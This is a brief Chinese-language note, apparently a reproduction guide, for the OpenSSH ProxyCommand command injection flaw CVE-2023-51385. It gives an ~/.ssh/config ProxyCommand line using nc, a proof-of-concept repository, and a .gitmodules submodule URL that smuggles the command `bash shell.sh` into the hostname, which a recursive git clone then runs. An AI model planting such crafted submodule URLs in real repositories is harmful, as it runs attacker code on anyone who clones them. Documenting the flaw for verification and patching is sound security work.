[OpenSSH ProxyCommand命令注入漏洞（CVE-2023-51385）附验证方法](https://mp.weixin.qq.com/s/6LwOlPSVQgwqkSFZ2iys7g)

- 条件 需要在~/.ssh/config 增加如下

```sh
host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
```

方式 1

```sh
git clone https://github.com/vin01/poc-proxycommand-vulnerable
# 修改 .gitmodules
```

方式 2 手动创建

1. 创建仓库
2. 添加子仓库

git submodule add https://gitee.com/xxxx/test

3. 修改 .gitmodules

```sh
[submodule "test"]
	path = test
	url = ssh://`bash shell.sh`foo.example.com/bar
```

4. push
5. `git clone https://github.com/zls1793/CVE-2023-51385_test --recurse-submodules`
